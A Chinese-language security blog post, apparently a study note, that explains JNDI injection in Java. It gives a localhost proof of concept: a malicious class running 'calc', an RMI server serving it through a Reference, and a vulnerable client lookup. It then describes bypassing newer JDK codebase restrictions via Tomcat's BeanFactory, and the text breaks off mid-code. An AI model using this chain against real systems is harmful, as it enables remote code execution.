        <content type="html"><![CDATA[<h1 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h1><p>JNDI(Java Naming and Directory Interface)是Java提供的Java命名和目录接口。通过调用JNDI的API可以定位资源和其他程序对象。<br>JNDI是Java EE的重要部分，JNDI可访问的现有的目录及服务有:JDBC、LDAP、RMI、DNS、NIS、CORBA</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>JNDI提供统一的客户端API，并由管理者将JNDI API映射为特定的<strong>命名服务</strong>和<strong>目录服务</strong>，为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定义用户、网络、机器、对象和服务等各种资源。简单来说，开发人员通过合理的使用JNDI，能够让用户通过统一的方式访问获取网络上的各种资源和服务。如下图所示<br><img src="/img/4-24/1.png"></p><h3 id="命名服务"><a href="#命名服务" class="headerlink" title="命名服务"></a>命名服务</h3><p>(Naming server)<br>命名服务将名称和对象进行关联，提供通过名称找到对象的操作，例如：DNS系统将计算机名和IP地址进行关联、文件系统将文件名和文件句柄进行关联等等。<br>在一些命名服务系统中，系统并不是直接将对象存储在系统中，而是保持对象的引用。引用包含了如何访问实际对象的信息。<br>    其中另一个值得一提的名称服务为 LDAP，全称为 Lightweight Directory Access Protocol，即轻量级目录访问协议，其名称也是从右到左进行逐级定义，各级以逗号分隔，每级为一个 name/value 对，以等号分隔。比如一个 LDAP 名称如下:</p><pre class="language-none"><code class="language-none">cn=John, o=Sun, c=US</code></pre><p>即表示在 c=US 的子域中查找 o=Sun 的子域，再在结果中查找 cn=John 的对象。关于 LDAP 的详细介绍见后文。<br>在名称系统中，有几个重要的概念:</p><ul><li>Bindings: 表示一个名称和对应对象的绑定关系，比如在文件系统中文件名绑定到对应的文件，在 DNS 中域名绑定到对应的 IP。</li><li>Context: 上下文，一个上下文中对应着一组名称到对象的绑定关系，我们可以在指定上下文中查找名称对应的对象。比如在文件系统中，一个目录就是一个上下文，可以在该目录中查找文件，其中子目录也可以称为子上下文 (subcontext).</li><li>References: 在一个实际的名称服务中，有些对象可能无法直接存储在系统内，这时它们便以引用的形式进行存储，可以理解为 C/C++ 中的指针。引用中包含了获取实际对象所需的信息，甚至对象的实际状态。比如文件系统中实际根据名称打开的文件是一个整数 fd (file descriptor)，这就是一个引用，内核根据这个引用值去找到磁盘中的对应位置和读写偏移。</li></ul><h3 id="目录服务"><a href="#目录服务" class="headerlink" title="目录服务"></a>目录服务</h3><p>（Directory Service）<br>简单来说，目录服务是命名服务的扩展，除了名称服务中已有的名称到对象的关联信息外，还允许对象拥有属性（Attributes）信息。由此，我们不仅可以根据名称去查找（Lookup）对象(并获取其对应属性)，还可以根据属性值去搜索（Search）对象。<br>一些常见的目录服务有：</p><ul><li>LDAP： 轻型目录访问协议</li><li>Active Directory: 为 Windows 域网络设计，包含多个目录服务，比如域名服务、证书服务等；</li><li>其他基于 X.500 (目录服务的标准) 实现的目录服务；</li></ul><h3 id="SPI"><a href="#SPI" class="headerlink" title="SPI"></a>SPI</h3><p>可参考：<a href="https://www.yuque.com/yyjccc/pk74ko/egeb71vsph4fgg9s">SnakeYaml</a><br>SPI 全称为 Service Provider Interface，即服务供应接口，主要作用是为底层的具体目录服务提供统一接口，从而实现目录服务的可插拔式安装。在 JDK 中包含了下述内置的目录服务:</p><ul><li>RMI: Java Remote Method Invocation，Java 远程方法调用；</li><li>LDAP: 轻量级目录访问协议；</li><li>CORBA: Common Object Request Broker Architecture，通用对象请求代理架构，用于 COS 名称服务(Common Object Services)；</li></ul><p>除此之外，用户还可以在 Java 官网下载其他目录服务实现。由于 SPI 的统一接口，厂商也可以提供自己的私有目录服务实现，用户可无需重复修改代码。</p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p><strong>RMI</strong><br>先起一个rmi服务端，代码忽略<br>注意这里我们同样需要实现接口，并且包名和RMI Server端相同，不然会报no security manager: RMI class loader disabled错误。<br>然后使用JNDI</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>yyjccc<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span></span><span class="token constant">JNDI</span><span class="token punctuation">.</span>usage<span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>yyjccc<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span></span><span class="token constant">RMI</span><span class="token punctuation">.</span>usage<span class="token punctuation">.</span>RMIService<span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">Context</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">InitialContext</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">NamingException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">RemoteException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Hashtable</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> rmi <span class="token punctuation">{</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NamingException</span><span class="token punctuation">,</span> <span class="token class-name">RemoteException</span> <span class="token punctuation">{</span><span class="token comment">//设置JNDI环境变量</span><span class="token class-name">Hashtable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> env <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hashtable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>env<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token class-name">Context</span><span class="token punctuation">.</span><span class="token constant">INITIAL_CONTEXT_FACTORY</span><span class="token punctuation">,</span> <span class="token string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>env<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token class-name">Context</span><span class="token punctuation">.</span><span class="token constant">PROVIDER_URL</span><span class="token punctuation">,</span> <span class="token string">"rmi://localhost:1099"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Context</span> initContext<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span>env<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">RMIService</span> rmiObj<span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">RMIService</span><span class="token punctuation">)</span> initContext<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token string">"myObj"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>rmiObj<span class="token punctuation">.</span><span class="token function">say</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>手动设置了属性_INITIAL_CONTEXT_FACTORY_和_PROVIDER_URL_的值来对Context进行初始化。通过对Context的初始化，JNDI能够识别我们想调用何种服务，以及服务的路径。<br>但实际上，在 Context#lookup()方法的参数中，用户可以指定自己的查找协议。JNDI会通过用户的输入来动态的识别用户要调用的服务以及路径</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NamingException</span><span class="token punctuation">,</span> <span class="token class-name">RemoteException</span> <span class="token punctuation">{</span><span class="token class-name">Context</span> initContext<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">RMIService</span> rmiObj<span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">RMIService</span><span class="token punctuation">)</span> initContext<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token string">"rmi://127.0.0.1:1099/myObj"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>rmiObj<span class="token punctuation">.</span><span class="token function">say</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><strong>DNS</strong></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>yyjccc<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span></span><span class="token constant">JNDI</span><span class="token punctuation">.</span>usage<span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">InitialContext</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">NamingException</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> dns <span class="token punctuation">{</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NamingException</span> <span class="token punctuation">{</span><span class="token class-name">String</span> url <span class="token operator">=</span> <span class="token string">"dns://v8qt8d.dnslog.cn"</span><span class="token punctuation">;</span><span class="token class-name">InitialContext</span> initialContext <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>initialContext<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="JNDI流程"><a href="#JNDI流程" class="headerlink" title="JNDI流程"></a>JNDI流程</h2><h3 id="上下文初始化"><a href="#上下文初始化" class="headerlink" title="上下文初始化"></a>上下文初始化</h3><p>以RMI不设置JNDI环境变量为例<br><img src="/img/4-24/2.png"><br>可以看到若是没有设置环境变量的Context，new InitialContext的过程正是读取环境变量和设置的JNDI环境变量<br>进入lookup中<br><img src="/img/4-24/3.png"><br>注意到其实我们不管调用的是lookup、bind或者是其他initalContext中的方法，都会调用getURLOrDefaultInitCtx()方法进行检查</p><p>跟进getURLOrDefaultInitCtx方法<br>会通过getURLScheme()方法来获取通信协议，比如这里获取到的是rmi协议<br><img src="/img/4-24/4.png"><br>接着跟据获取到的协议，通过NamingManager#getURLContext()来调用getURLObject()方法<br><img src="/img/4-24/5.png"><br>最终在getURLObject()方法中，根据_defaultPkgPrefix_属性动态生成Factory类<br>这里scheme是rmi，所以得到的类名是rmiURLContextFactory</p><p>看一下JNDI默认支持那些动态协议转换。当我们针对JNDI进行攻击的时候可以优先考虑以下几种服务<br><img src="/img/4-24/6.png"></p><p>通过动态协议转换，我们可以仅通过一串特定字符串就可以指定JNDI调用何种服务，十分方便。但是方便是会付出一定代价的。对于一个系统来讲，往往越方便，就越不安全。<br>假如我们能够控制string字段，那么就可以搭建恶意服务，并控制JNDI接口访问该恶意，于是将导致恶意的远程class文件加载，从而导致远程代码执行。这种攻击手法其实就是JNDI注入，它和RMI服务攻击手法中的”远程加载CodeBase”较为类似，都是通过一些远程通信来引入恶意的class文件，进而导致代码执行</p><h3 id="Reference类"><a href="#Reference类" class="headerlink" title="Reference类"></a>Reference类</h3><p>该类也是在javax.naming的一个类，该类表示对在命名/目录系统外部找到的对象的引用。提供了JNDI中类的引用功能<br>比如远程获取 RMI 服务上的对象是 Reference 类或者其子类，则在客户端获取到远程对象存根实例时，可以从其他服务器上加载class文件来进行实例化。<br>Reference类常用构造函数如下</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">//className为远程加载时所使用的类名，如果本地找不到这个类名，就去远程加载</span><span class="token comment">//factory为工厂类名</span><span class="token comment">//factoryLocation为工厂类加载的地址，可以是file://、ftp://、http:// 等协议</span><span class="token class-name">Reference</span><span class="token punctuation">(</span><span class="token class-name">String</span> className<span class="token punctuation">,</span>  <span class="token class-name">String</span> factory<span class="token punctuation">,</span> <span class="token class-name">String</span> factoryLocation<span class="token punctuation">)</span> </code></pre><p>在RMI中，由于我们远程加载的对象需要继承UnicastRemoteObject类，所以这里我们需要使用ReferenceWrapper类对Reference类或其子类对象进行远程包装成Remote类使其能够被远程访问。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">ReferenceWrapper</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">NamingException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">Reference</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">AlreadyBoundException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">RemoteException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">LocateRegistry</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">Registry</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> jndi <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NamingException</span><span class="token punctuation">,</span> <span class="token class-name">RemoteException</span><span class="token punctuation">,</span> <span class="token class-name">AlreadyBoundException</span> <span class="token punctuation">{</span>        <span class="token class-name">String</span> url <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:8080"</span><span class="token punctuation">;</span>         <span class="token class-name">Registry</span> registry <span class="token operator">=</span> <span class="token class-name">LocateRegistry</span><span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Reference</span> reference <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Reference</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">,</span> url<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ReferenceWrapper</span> referenceWrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReferenceWrapper</span><span class="token punctuation">(</span>reference<span class="token punctuation">)</span><span class="token punctuation">;</span>        registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"aa"</span><span class="token punctuation">,</span>referenceWrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="JNDI注入-1"><a href="#JNDI注入-1" class="headerlink" title="JNDI注入"></a>JNDI注入</h2><p>为了在命名服务或目录服务中绑定Java对象，可以使用Java序列化来传输对象，但有时候不太合适，比如Java对象较大的情况。因此JNDI定义了命名引用(Naming References)，后面直接简称引用(References)。这样对象就可以通过绑定一个可以被命名管理器(Naming Manager)解码并解析为原始对象的引用，间接地存储在命名或目录服务中。<br>    引用由Reference类来表示，它由地址(RefAddress)的有序列表和所引用对象的信息组成。而每个地址包含了如何构造对应的对象的信息，包括引用对象的Java类名，以及用于创建对象的ObjectFactory类的名称和位置。<br>Reference可以使用ObjectFactory来构造对象。当使用lookup()方法查找对象时，Reference将使用提供的ObjectFactory类的加载地址来加载ObjectFactory类，ObjectFactory类将构造出需要的对象。<br>所谓的 JNDI 注入就是控制 lookup 函数的参数，这样来使客户端访问恶意的 RMI 或者 LDAP 服务来加载恶意的对象，从而执行代码，完成利用<br>在 JNDI 服务中，通过绑定一个外部远程对象让客户端请求，从而使客户端恶意代码执行的方式就是利用 Reference 类实现的。Reference 类表示对存在于命名/目录系统以外的对象的引用。<br>    具体则是指如果远程获取 RMI 服务器上的对象为 Reference 类或者其子类时，则可以从其他服务器上加载 class 字节码文件来实例化</p><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>先写个恶意类EvilClass</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">EvilClass</span> <span class="token punctuation">{</span><span class="token keyword">static</span> <span class="token punctuation">{</span><span class="token keyword">try</span> <span class="token punctuation">{</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>编写rmi服务端，使用Reference引用http上的class文件</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>yyjccc<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span></span><span class="token constant">JNDI</span><span class="token punctuation">.</span>exp<span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">ReferenceWrapper</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">NamingException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">Reference</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">AlreadyBoundException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">RemoteException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">LocateRegistry</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">Registry</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Refer</span> <span class="token punctuation">{</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NamingException</span><span class="token punctuation">,</span> <span class="token class-name">RemoteException</span><span class="token punctuation">,</span> <span class="token class-name">AlreadyBoundException</span> <span class="token punctuation">{</span><span class="token class-name">String</span> url <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:8080/"</span><span class="token punctuation">;</span><span class="token class-name">Registry</span> registry <span class="token operator">=</span> <span class="token class-name">LocateRegistry</span><span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Registry start"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Reference</span> reference <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Reference</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">,</span> <span class="token string">"EvilClass"</span><span class="token punctuation">,</span> url<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">ReferenceWrapper</span> referenceWrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReferenceWrapper</span><span class="token punctuation">(</span>reference<span class="token punctuation">)</span><span class="token punctuation">;</span>registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"aa"</span><span class="token punctuation">,</span>referenceWrapper<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>注意new Reference的第二个参数为全类目，第三个参数为加载资源的目录<br>不要搞错，可能就会出现类加载错误</p><p>被攻击的客户端使用JNDI</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>yyjccc<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span></span><span class="token constant">JNDI</span><span class="token punctuation">.</span>exp<span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">Context</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">InitialContext</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">NamingException</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Client</span> <span class="token punctuation">{</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NamingException</span> <span class="token punctuation">{</span><span class="token class-name">Context</span> context<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> url<span class="token operator">=</span><span class="token string">"rmi://127.0.0.1:1099/aa"</span><span class="token punctuation">;</span>context<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>成功弹出计算器<br><img src="/img/4-24/7.png"><br>通过以上实例可以清晰的看到看到，如果lookup()函数的访问地址参数控制不当，则有可能导致加载远程恶意类。<br>JNDI接口可以调用多个含有远程功能的服务，所以我们的攻击方式也多种多样。但流程大同小异，如下图所示<br><img src="/img/4-24/8.png"></p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>为了方便远程加载字节码，就别把恶意的字节码放在项目里<br>我直接使用yakit开启rmi服务<br><img src="/img/4-24/9.png"><br>跟进客户端lookup方法<br>在RegistryContext#lookup中<br>先获得到远程对象<br><img src="/img/4-24/10.png"><br>关键是后面的decodeObject对象<br><img src="/img/4-24/11.png"><br>跟进decodeObject<br><img src="/img/4-24/12.png"><br>首先就会判断远程对象是否为RemoteReference类型<br>恰好在服务端绑定的对象为ReferenceWrapper类实例，ReferenceWrapper也是实现了RemoteReference接口<br><img src="/img/4-24/13.png"><br>那么会调用远程对象的getReference方法<br>进入到ReferenceWrapper类中<br><img src="/img/4-24/14.png"><br>getReference方法就是返回了所包装的Reference<br>最终结果就是拿到了Reference(解开包装了)，若是其他远程对象，则没有任何变化<br>继续跟进NamingManager#getObjectInstance<br>若果传入的是Reference类型对象，那么就会根据Reference中的classFactory和classFactoryLocation获取factory工厂<br><img src="/img/4-24/15.png"><br>继续跟进<br><img src="/img/4-24/16.png"><br>首先本地加载类，找不到在使用codebase远程加载类<br>跟进到VersionHelp#loadClass<br><img src="/img/4-24/17.png"><br>这里创建URLClassLoader<br>跟进到loadClass<br><img src="/img/4-24/18.png"><br>也是到了最终的方法Class.forName加载恶意字节码，第二个参数为true，就会触发恶意字节码中的静态代码块</p><h2 id="JDK高版本限制绕过"><a href="#JDK高版本限制绕过" class="headerlink" title="JDK高版本限制绕过"></a>JDK高版本限制绕过</h2><p>JDK 6u132、7u122、8u113后已经默认不允许加载codebase中的远程类，如果想要根据Codebase加载位于远端服务器的类时，java.rmi.server.useCodebaseOnly的值必须为false。但是从JDK 6u45、7u21开始，java.rmi.server.useCodebaseOnly 的默认值就是true。<br><img src="/img/4-24/19.png"><br>上面高版本 JDK 中无法加载远程代码的异常出现在 com.sun.jndi.rmi.registry.RegistryContext#decodeObject 中<br>其中修改代码为<br><img src="/img/4-24/20.png"><br>绕过这个：<br>方法一：令 ref 为空，从语义上看需要 obj 既不是<br> Reference 也不是 Referenceable。即，不能是对象引用，只能是原始对象，这时候客户端直接实例化本地对象，远程 RMI 没有操作的空间，因此这种情况不太好利用；<br>方法二：令 ref.getFactoryClassLocation() 返回空。即，让 ref 对象的 classFactoryLocation 属性为空，这个属性表示引用所指向对象的对应 factory 名称，对于远程代码加载而言是 codebase，即远程代码的 URL 地址(可以是多个地址，以空格分隔)，这正是我们上文针对低版本的利用方法；如果对应的 factory 是本地代码，则该值为空，这是绕过高版本 JDK 限制的关键；<br>方法三：直接自己本地使用命令行指定com.sun.jndi.rmi.object.trustURLCodebase 参数。</p><p>我们可以从本地加载合适Reference Factory。<br>需要注意是，该本地工厂类必须实现javax.naming.spi.ObjectFactory接口,因为在javax.naming.spi.NamingManager#getObjectFactoryFromReference最后的return语句对Factory类的实例对象进行了类型转换，并且该工厂类至少存在一个getObjectInstance()方法。</p><h3 id="Tomcat8"><a href="#Tomcat8" class="headerlink" title="Tomcat8"></a>Tomcat8</h3><p>org.apache.naming.factory.BeanFactory就是满足条件之一，并由于该类存在于Tomcat8依赖包中，攻击面和成功率还是比较高的。<br>org.apache.naming.factory.BeanFactory 在 getObjectInstance() 中会通过反射的方式实例化Reference所指向的任意Bean Class，并且会调用setter方法为所有的属性赋值。而该Bean Class的类名、属性、属性值，全都来自于Reference对象，均是攻击者可控的。</p><p>服务端和客户端都要有tomcat8依赖</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token generics"><span class="token punctuation">&lt;</span>dependency<span class="token punctuation">&gt;</span></span>    <span class="token generics"><span class="token punctuation">&lt;</span>groupId<span class="token punctuation">&gt;</span></span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>tomcat<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">&gt;</span>    <span class="token generics"><span class="token punctuation">&lt;</span>artifactId<span class="token punctuation">&gt;</span></span>tomcat<span class="token operator">-</span>catalina<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">&gt;</span>    <span class="token generics"><span class="token punctuation">&lt;</span>version<span class="token punctuation">&gt;</span></span><span class="token number">8.5</span><span class="token number">.0</span><span class="token operator">&lt;</span><span class="token operator">/</span>version<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>dependency<span class="token operator">&gt;</span><span class="token generics"><span class="token punctuation">&lt;</span>dependency<span class="token 